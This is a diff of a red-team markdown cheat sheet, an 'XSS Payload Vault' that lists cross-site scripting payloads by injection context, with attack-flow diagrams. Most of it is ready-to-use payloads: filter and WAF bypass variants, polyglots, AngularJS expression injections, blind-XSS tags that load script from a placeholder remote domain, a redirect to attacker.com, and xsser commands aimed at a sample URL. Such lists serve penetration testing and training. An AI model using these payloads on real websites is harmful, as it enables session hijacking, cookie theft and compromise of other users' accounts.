@@ -7,14 +7,49 @@ tags:
   - redteam
   - cheat-sheet
 ---
-# 🧨 XSS Payload Vault
+#  XSS Payload Vault
 
 > [!abstract] **Overview**
 > Structured vault for common **XSS payload families**, organized by **execution context** for fast offensive testing and filter bypass analysis.
 
----
-
 # Reflected XSS
+
+```mermaid
+flowchart TD
+%% -------------------------------
+%% Reflected XSS Flow - Clean Report Style
+%% -------------------------------
+
+subgraph Attacker["🧑‍💻  Attacker"]
+A1["Crafts malicious URL<br><code>http://website.com/page.php?payload</code>"]
+end
+
+subgraph Target["💻  Target (Victim User)"]
+T1["Receives malicious link"]
+T2["Clicks the link → Browser sends request"]
+T3["Receives reflected response containing payload<br>and executes the injected script"]
+end
+
+subgraph Website["🌐  Vulnerable Website"]
+W1["Receives HTTP Request with unsanitized payload"]
+W2["Reflects payload in HTTP Response<br><code>&lt;script&gt;PAYLOAD&lt;/script&gt;</code>"]
+end
+
+%% --- Flow connections ---
+A1 -->|1️⃣  Sends crafted link| T1
+T1 -->|2️⃣  Clicks link| W1
+W1 -->|3️⃣  Returns response containing payload| T3
+
+%% --- Styling ---
+classDef attacker fill:#ffe5e5,stroke:#ff4d4d,stroke-width:2px,color:#000;
+classDef target fill:#e6ffe6,stroke:#28a745,stroke-width:2px,color:#000;
+classDef website fill:#e6f2ff,stroke:#1a75ff,stroke-width:2px,color:#000;
+class A1 attacker;
+class T1,T2,T3 target;
+class W1,W2 website;
+
+```
+
 
 > [!info]
 > **Reflected XSS** occurs when user input is immediately reflected in the HTTP response without proper encoding.
@@ -28,15 +63,41 @@ tags:
 ><iframe srcdoc="<script>alert(1)</script>"></iframe>
 >```
 
----
-
 # Stored XSS
+
+```mermaid
+flowchart TD
+
+Attacker["🧑‍💻 Attacker"]
+Website["🌐 Vulnerable Website"]
+Victim["💻 Victim / Target Browser"]
+
+Attacker -->| Inject malicious XSS payload<br>into website code or database| Website
+
+Victim -->| Victim visits the website| Website
+
+Website -->|Serves page containing<br>stored XSS payload| Victim
+
+Victim -->| Malicious script executes<br>and exfiltrates data| Attacker
+
+
+classDef attacker fill:#ffe5e5,stroke:#ff4d4d,stroke-width:2px,color:#000;
+classDef server fill:#e6f2ff,stroke:#1a75ff,stroke-width:2px,color:#000;
+classDef victim fill:#e6ffe6,stroke:#28a745,stroke-width:2px,color:#000;
+
+class Attacker attacker;
+class Website server;
+class Victim victim;
+
+```
 
 > [!success]
 > Payload is **persisted on the server** (comments, forums, profiles).
 
 > [!example] Stored Payloads
 >```
+><script>window.location.replace("https://attacker.com")</script>
+><script>document.write("Site PWN")</script>
 ><script>alert(document.cookie)</script>
 ><img src=x onerror=alert('Stored XSS')>
 ><video src=x onerror=alert(1)>
@@ -44,9 +105,26 @@ tags:
 ><iframe srcdoc="<svg onload=alert(1)>"></iframe>
 >```
 
----
-
 #  DOM-Based XSS
+
+```mermaid
+sequenceDiagram
+
+participant A as Attacker
+participant V as Victim Browser
+participant W as Website
+participant D as Client JavaScript
+
+A->>V: Send malicious URL
+V->>W: Request page
+W-->>V: Return normal page
+V->>D: Execute JavaScript
+D->>D: Read location.hash
+D->>D: Inject into innerHTML
+D-->>V: Malicious JS executes
+
+```
+
 
 > [!question]
 > Occurs entirely **client-side** when JavaScript inserts unsanitized data into the DOM.
@@ -58,7 +136,7 @@ document.write(location.hash)
 element.innerHTML = location.search
 ```
 
-> [!example] DOM Payloads
+> [!example]- DOM Payloads
 >```
 >#<svg onload=alert(1)>
 >?xss=<img src=x onerror=alert(1)>
@@ -67,14 +145,13 @@ element.innerHTML = location.search
 >```
 
 ---
-
 # HTML Context Payloads
 
 > [!info]
 >
 >Payloads that execute when input is inserted directly inside HTML.
 
-> [!example]
+> [!example]-
 >```
 ><script>alert(1)</script>
 ></script><script>alert(1)</script>
@@ -83,14 +160,12 @@ element.innerHTML = location.search
 ><iframe src=javascript:alert(1)>
 >```
 
----
-
 # Attribute Injection
 
 > [!warning]
 > Used when user input appears **inside an HTML attribute value**.
 
-> [!example]
+> [!example]-
 >```
 >"><img src=x onerror=alert(1)>
 >' onmouseover='alert(1)
@@ -104,7 +179,7 @@ element.innerHTML = location.search
 >
 >Execution through HTML events.
 
-> [!example]
+> [!example]-
 >```
 ><img src=x onerror=alert(1)>
 ><body onload=alert(1)>
@@ -117,28 +192,24 @@ element.innerHTML = location.search
 ><form onsubmit=alert(1)>
 >```
 
----
-
 # Protocol Abuse
 
 > [!warning]
 >
 >Execution through dangerous URL schemes.
 
-> [!example] javascript protocol
+> [!example]- javascript protocol
 >```
 ><a href="javascript:alert(1)">click</a>
 ><form action="javascript:alert(1)">
 ><iframe src="javascript:alert(1)">
 >```
 
-> [!example] data URI
+> [!example]- data URI
 >```
 >data:text/html,<script>alert(1)</script>
 ><iframe src="data:text/html,<script>alert(1)</script>"></iframe>
 >```
-
----
 
 # Embedded Contexts
 
@@ -146,7 +217,7 @@ element.innerHTML = location.search
 >
 >Execution through embedded browser contexts.
 
-> [!example]
+> [!example]-
 >```
 ><iframe srcdoc="<script>alert(1)</script>"></iframe>
 ><object data="data:text/html,<script>alert(1)</script>"></object>
@@ -159,7 +230,7 @@ element.innerHTML = location.search
 >
 >XML based tags that bypass naive filters.
 
-> [!example]
+> [!example]-
 >```
 ><svg onload=alert(1)>
 ><svg><script>alert(1)</script></svg>
@@ -168,14 +239,12 @@ element.innerHTML = location.search
 ><math><mi><script>alert(1)</script></mi></math>
 >```
 
----
-
 # Polyglot Payloads
 
 > [!warning]
 Payloads that execute in **multiple contexts simultaneously**.
 
-> [!example]
+> [!example]-
 >```
 >"><svg onload=alert(1)>
 >'></script><script>alert(1)</script>
@@ -184,15 +253,13 @@ Payloads that execute in **multiple contexts simultaneously**.
 >"><body onload=alert(1)>
 >```
 
----
-
 # Filter Bypass Techniques
 
 > [!bug]
 >
 >Payload transformations to evade WAF or input filters.
 
-> [!example]
+> [!example]-
 >```
 ><ScRiPt>alert(1)</sCrIpT>
 >%3Cscript%3Ealert(1)%3C/script%3E
@@ -202,15 +269,13 @@ Payloads that execute in **multiple contexts simultaneously**.
 ><a href=JaVaScRiPt:alert(1)>Click</a>
 >```
 
----
-
 # Blind XSS
 
 > [!danger]
 >
 >Used when execution happens **in another user's browser** (admin panels etc).
 
-> [!example]
+> [!example]-
 >```
 ><script src=//YourXSSHunterDomain></script>
 >"><script src=//YourXSSHunterDomain></script>
@@ -223,15 +288,13 @@ var i=new Image;
 ></script>
 >```
 
----
-
 # Framework Injection
 
 > [!info]
 >
 >Client-side framework expression injections.
 
-> [!example]
+> [!example]-
 >##### **AngularJS**
 >```
 >{{constructor.constructor('alert(1)')()}}
@@ -254,9 +317,24 @@ var i=new Image;
 
 ---
 
-# 🛡 Defense & Mitigation
+# Tools
 
-> [!danger]
+> [!success] XSSERS
+> ```
+> xsser --url 'http://example/index.php?page=lookup.php' -p
+'target_host=XSS&lookup-php-submit-button=Lookup+DNS'
+> ```
+>```
+> xsser --url 'http://example/index.php?page=lookup.php' -p
+'target_host=XSS&lookup-php-submit-button=Lookup+DNS' --auto
+> ```
+> ```
+> xsser --url 'http://example/index.php?page=lookup.php' -p
+'target_host=XSS&lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(365)</script>"
+> ```
+
+
+> [!info]- 🛡 Defense & Mitigation
 > 
 > **Best Practices**
 > 
